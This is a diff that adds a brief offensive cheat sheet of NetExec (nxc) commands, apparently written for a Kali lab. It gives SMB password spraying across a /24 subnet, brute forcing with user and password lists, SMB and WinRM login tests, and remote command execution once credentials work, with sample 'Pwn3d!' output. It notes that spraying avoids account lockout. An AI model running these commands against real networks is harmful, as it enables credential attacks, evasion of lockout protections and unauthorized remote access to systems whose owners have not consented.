@@ -1,0 +1,19 @@
+
+🎯 RUN ON: Kali
+🔥 PASSWORD SPRAY (TOP COMMAND)
+nxc smb 172.25.170.0/24 -u users.txt -p 'Password123'
+🧠 Meaning:
+one password → many users
+👉 avoids account lockout
+🔥 BRUTE FORCE (USER + PASS LIST)
+nxc smb 172.25.170.0/24 -u users.txt -p passwords.txt
+🔥 SINGLE LOGIN TEST
+nxc smb 172.25.170.X -u admin -p password123
+🔥 WINRM LOGIN
+nxc winrm 172.25.170.X -u admin -p password123
+🔥 EXECUTE AFTER SUCCESS
+nxc smb 172.25.170.X -u admin -p password123 -x "whoami"
+🧠 OUTPUT
+[+] 172.25.170.X admin:password123 (Pwn3d!)
+
+👉 FULL ACCESS CONFIRMED
